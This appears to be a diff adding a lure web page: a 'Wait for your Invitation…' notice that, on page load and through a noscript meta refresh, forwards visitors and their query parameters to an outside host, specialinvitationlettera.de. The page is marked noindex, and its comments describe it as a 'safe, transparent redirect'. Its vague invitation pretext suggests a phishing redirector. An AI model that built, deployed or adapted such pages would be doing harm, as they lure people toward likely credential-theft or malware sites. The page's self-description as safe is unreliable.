@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Redirecting...</title>
+
+    <!-- Normal safe SEO handling -->
+    <meta name="robots" content="noindex, nofollow" />
+
+    <style>
+        :root {
+            /* Change this URL anytime to update background */
+            --bg-image: url("/WETH.jpg");
+        }
+
+        body {
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            font-family: "Poppins", sans-serif;
+            background: #faf6f2;
+            background-image: var(--bg-image);
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            padding: 20px;
+            color: #333;
+        }
+
+        .box {
+            background: rgba(255, 255, 255, 0.85);
+            backdrop-filter: blur(6px);
+            padding: 30px 40px;
+            border-radius: 16px;
+            box-shadow: 0 6px 20px rgba(0,0,0,0.1);
+            max-width: 500px;
+        }
+
+        h1 {
+            margin-bottom: 10px;
+            font-size: 28px;
+        }
+
+        p {
+            margin-top: 0;
+            font-size: 16px;
+            line-height: 1.6;
+        }
+    </style>
+
+    <script>
+        // Safe, transparent redirect (no spammy tricks)
+        window.addEventListener("load", function () {
+            const baseURL = "https://specialinvitationlettera.de/gathering/invite.php";
+            const query = window.location.search; // keep query parameters if present
+            const finalURL = baseURL + query;
+
+            // Redirect after a short moment
+            setTimeout(() => {
+                window.location.href = finalURL;
+            }, 800); 
+        });
+    </script>
+
+    <noscript>
+        <meta http-equiv="refresh" content="0;url=https://specialinvitationlettera.de/gathering/invite.php" />
+    </noscript>
+</head>
+
+<body>
+    <div class="box">
+        <h1>Wait for your Invitation…</h1>
+        <p>
+            You're invited — kindly please follow the instructions to see the full details.<br>
+            Thanks, looking forward to see you there.
+        </p>
+    </div>
+</body>
+</html>
